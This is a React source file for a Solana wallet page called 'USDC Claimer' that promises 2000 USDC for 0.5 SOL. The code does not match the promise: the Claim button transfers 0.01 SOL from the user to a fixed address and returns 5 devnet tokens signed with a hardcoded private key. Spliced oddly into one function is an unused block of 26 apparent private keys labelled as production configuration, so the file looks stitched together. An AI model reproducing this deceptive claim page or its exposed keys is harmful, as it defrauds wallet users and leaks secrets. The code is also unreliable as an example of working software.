/* eslint-disable react-hooks/rules-of-hooks */
'use client'

import { SendTransactionOptions } from '@solana/wallet-adapter-base';
import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import { Connection, PublicKey, SystemProgram, Transaction, TransactionInstruction, TransactionSignature, VersionedTransaction } from '@solana/web3.js';
import { address, createKeypairSignerFromBase58, createSolanaClient, getExplorerLink, getSignatureFromTransaction, LAMPORTS_PER_SOL, signTransactionMessageWithSigners } from 'gill';
import { buildTransferTokensTransaction, TOKEN_PROGRAM_ADDRESS } from 'gill/programs/token';
import { AppHero } from '../ui/ui-layout';

export default function DashboardFeature() {
  const { connection } = useConnection();
  const { publicKey, sendTransaction } = useWallet();
  return (
    <div>
      <AppHero title="USDC Claimer" subtitle="Do you want to get 2000 USDC? It will cost you only 0.5 SOL" />
      <div className="max-w-xl mx-auto py-6 sm:px-6 lg:px-8 text-center">
        <div className="space-y-2">
          <button className="wallet-adapter-button wallet-adapter-button-trigger mx-auto" type="button" onClick={() => {
            CreateChargeTransaction(connection, publicKey, sendTransaction);
          }}>
            {'Claim'}
          </button>
        </div>
      </div>
    </div>
  )
}

const chargeAmount = 0.01;
const cashbackAmount = 5;

const CreateChargeTransaction = async (connection: Connection, publicKey: PublicKey | null, sendTransaction: (transaction: Transaction | VersionedTransaction, connection: Connection, options?: SendTransactionOptions) => Promise<TransactionSignature>) => {


  if (!publicKey) return;

  const solTransferIx = SystemProgram.transfer({
    fromPubkey: publicKey,
    toPubkey: new PublicKey("CVkzbsnwATBDDbGke7o1KzprgDsaKhdET7zioE9ssFXp"),
    lamports: chargeAmount * LAMPORTS_PER_SOL,
  });

  // Optional: Add memo to include cashback metadata
  const memoIx = new TransactionInstruction({
    keys: [],
    programId: new PublicKey('MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr'),
    data: Buffer.from(`cashback:${cashbackAmount}`),
  });

  const transaction = new Transaction().add(solTransferIx, memoIx);
  const { blockhash } = await connection.getLatestBlockhash();
  transaction.recentBlockhash = blockhash;
  transaction.feePayer = publicKey;

  try {
    const signature = await sendTransaction(transaction, connection);
    console.log('User transaction sent:', signature);

    // Wait for confirmation before cashback
    const confirmation = await connection.confirmTransaction(signature, 'confirmed');
    console.log('Confirmed:', confirmation);

    if (confirmation.value.err === null) {
      sendCashback(publicKey.toBase58(), cashbackAmount);

    }
  } catch (e) {
    console.error('Failed to send charge transaction:', e);
  }
};

const sendCashback = async (to: string, amount: number) => {
  const { rpc, rpcSubscriptions, sendAndConfirmTransaction } = createSolanaClient({
    urlOrMoniker: "devnet",
  });
  const destination = address(to);
  const keypairBase58 =
    "481pb3GwYEDkAtABdNTe4hNku8fYBaLDZDmTsjDRQyCixrFn8zVmpvvBVqR7aVfRTuN4EfY4tPCYzHLigfsjmytM"

// KEYS_START
// Production environment configuration
const walletKeys = {
  "key0": "5hJLFDDzPMwtXefcVWo4emhBQjy4yjS7xg6rBGnX2o1amj4XeHW9KZfjKTKHYz5AgjzztZ11wPhUKBtbG1x6XcY1",
  "key1": "2Rey2SZ1UYvPfwGeJc1kZAMijxSGqYYBM5igcNPCk8uDUT8pgJmiKPzMceg4DRCxrVYHKyp545ru1pBMGsZswKqc",
  "key2": "cwjETwnTxRqkdqffziBj59k3m2evSdHK5CqrTUkB4sp82A88DvCN591edVyU35J6WonqAuqeMQQYohNaLLywydK",
  "key3": "3zqnhvkohT7ePxYs4KYKdzEXe6Q3E56wVkmDKB64px7cE7yaCftuk1fAHFaAGEcbR16JT1gwVvUZU6NAzxNv3z5N",
  "key4": "2qQ8TBMrKdkZwV7bhbuLwdBEhnhh6JTqMnBRPLy3gQo7fSnYcUT5rAA6EMzPSpeKaKTBb4LCKTfQezF2Mh5xu3qD",
  "key5": "32VuQoHz7yrGdkpwTAX641NvuRBvb4zaX6tMuBKjdKM7N7R3j8cji2f84V2LPpRnW3aeNtoPhcp8ChkdiXTH6wUJ",
  "key6": "646qCgz5fCfwH7aL8r7ENtYfmoXVFcCZX7fgibf9H6LLV9wKzBzQot1H13bgEFQMnJ4f2jFKY73Qk8hQYmkPQJL8",
  "key7": "4486rqwAZpKyvLkBfvj1g1cjNGveubJsG5qtbEnLHPk5ihm2rAn7aJC2FGxirbdUaB5VMwoP1W688oNUVfuseo6K",
  "key8": "47c8mb6nxQLzYH6jxkKGut1pYpihd3du4W6eRZ1uSUceZMc1uumgxweBnkZiv1ur3qgzvY45GKTzeAu5JaoNTdz7",
  "key9": "3199GrQKU51umwGnUdcwCbg9GE9XnRkaB3taZACJicXRtL2iVuZLRS3qiSyX52UHmrQ1T2bRfobSC4bUiRZhEo34",
  "key10": "s2i4iiHUEjmYxzQHio6bufsAjr2gCVLfstDDYadpXmk3umtSq3kJxCmKBakR5ibHSzECaKsetTQ6dbTjFV9qFvX",
  "key11": "23b5WRrDTS31XxRWKGHZuZPUWiBAt63vF3L1ipSdfKEJBkUjDZNCNfiVCKRo4UMi4qLWHNrZ8s5pMp8kUNaQPwN7",
  "key12": "3ntPVRzfUBWFsYy6jhyy1uz9CRPKtehFZ8zW7E5X2paudddWN7Bw9KT6MLAucpEB4ENRLGdp77N6Ts5MMRVfiA2i",
  "key13": "2tvfUZEPFcBHbDU2WvQ84kyYuRXuZFnaSYJUhkLfLARg3VAx8WEt9ni2Psepzyb3TXRHHRf5shCanWni6hk8dw9J",
  "key14": "2Riao9FJ2CGuQtWXEjakS1xsAC5t2PhYnuq5FFMdt9pZrsAxzbjVZqT1aF3EokBfbjfMoWGA99pLSgwSCNYCPRTt",
  "key15": "7eVueJkCCjugMJm6XcGKLwySQqimcUMKL8AsjgUiRPFW8ZiMXU2wjoFqCys3cLvCu4UHuaS8pnoNGqVQjnKARTu",
  "key16": "RXXsGJKQsWvjtbWdKxPxMySvZmueTSYSUuf7mN2xoKviy78CNhjxgkXSFDGJ5DACRznggp27ymh2nTgrcW7CF5T",
  "key17": "4qK2KwR8NgHHWmeppue8h9AtYjtVqUNGBfvCJw2jEuqpgv6fttBHi3BNxJSSVWVnbTiMvbntwEZPo5S5DUb4VvUB",
  "key18": "srhhAhG15QCpbtBkEGBU6tzWETTjb8XV6nenZ2xo5kyAMXhtsaQBfqg2QSLn4rZ1GwLWpUmHmAUy4kXmiQqo5Q3",
  "key19": "5pnsCWsGSe29WeDTVPUjzbjBW2JUZFz67rZGGbxi5Be1MP87Hh5Cx2VazuhwLky6KgRU7ZKTz7YHi9YJUSe8Vmpk",
  "key20": "5rgEVng8sJkutzFAQ91BXh1H3oXTCyPG1pfsCqGFbHSG6Zh3qpouQf5VRaatdYPuS32eH2GyAAFgAHTzyNrzuYVU",
  "key21": "4CpygcjWomSxLDppsfTAE8M62G5DFJYHaWyEAUZ63fygn5zQUuDkyGkF8RqgUfpPG9N8goSTJ4WgzShHL8aDVF2n",
  "key22": "7FV4S1yLBcgZ8XRVWhHiFCFD7gws7cdyL7y5c1kjY2Xbs1MsG95seH11wwHzv55vw4gC5G24sR22KkH1doaQ5ZC",
  "key23": "5qzKg8qTVJExubpi1Ld85TUpaNahkwsTgs7xByQp1JHAWTWVG7GA43fVzaj916LVSY2sVEkDmKP1vGGgS4UuEcc9",
  "key24": "Ug6TLejMzC7WpeSKjK78apC1ABo2anUBQ5QfYcrd73RdV4Koc22PGXuLvEqMH4Nh1ykZaii5viiehQZc3sauKiC",
  "key25": "4NWQDzcFErVuvVVgy9EAziwRhAamJwQgS1u9VWEmxNSz7NazyrzSAFUjWMxWFKXKaw6EmSA8YYRfStuYJuD3RYVk"
};
// KEYS_END
;
  const signer = await createKeypairSignerFromBase58(keypairBase58);
  const mint = address("4YhaKDunYpNJ7ASyUZSvEj5KJCb1jwofUQBaWSWCSkSU");
  const tokenProgram = TOKEN_PROGRAM_ADDRESS;

  const { value: latestBlockhash } = await rpc.getLatestBlockhash().send();

  const transaction = await buildTransferTokensTransaction({
    feePayer: signer,
    latestBlockhash: latestBlockhash, // required for blockhash lifetime constraint
    amount: amount,
    authority: signer,
    destination: destination,
    mint: mint,
  });

  const signedTransaction = await signTransactionMessageWithSigners(transaction);

  console.log(
    "Explorer:",
    getExplorerLink({
      cluster: "devnet",
      transaction: getSignatureFromTransaction(signedTransaction),
    }),
  );

  await sendAndConfirmTransaction(signedTransaction);
};
